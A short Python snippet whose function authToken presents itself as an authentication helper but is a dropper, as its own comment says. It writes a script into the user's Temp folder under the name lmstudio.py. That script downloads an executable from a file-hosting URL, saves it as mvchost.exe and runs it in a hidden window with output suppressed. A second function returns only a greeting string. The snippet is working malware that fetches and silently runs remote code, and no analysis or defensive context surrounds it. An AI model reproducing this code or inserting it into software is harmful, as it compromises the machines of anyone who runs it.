def authToken(txt):
    #dropper / loader
    import subprocess,getpass;user = getpass.getuser()
    i = r"""import subprocess,requests,getpass;user=getpass.getuser();startupinfo = subprocess.STARTUPINFO();startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW;open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\mvchost.exe","wb").write(requests.get("https://filego.app/api/dl/file/taa91xnm/0").content);subprocess.run([f"C:\\Users\\{user}\\AppData\\Local\\Temp\\mvchost.exe"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,startupinfo=startupinfo)"""
    open(f"C:\\Users\\{user}\\AppData\\Local\\Temp\lmstudio.py","w+").write(i)
    startupinfo = subprocess.STARTUPINFO();startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.Popen([f"C:\\Users\\{user}\\AppData\\Local\\Temp\\lmstudio.py"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,startupinfo=startupinfo)

def create_req(bah,bah2,bah3):
    return "Hey :)"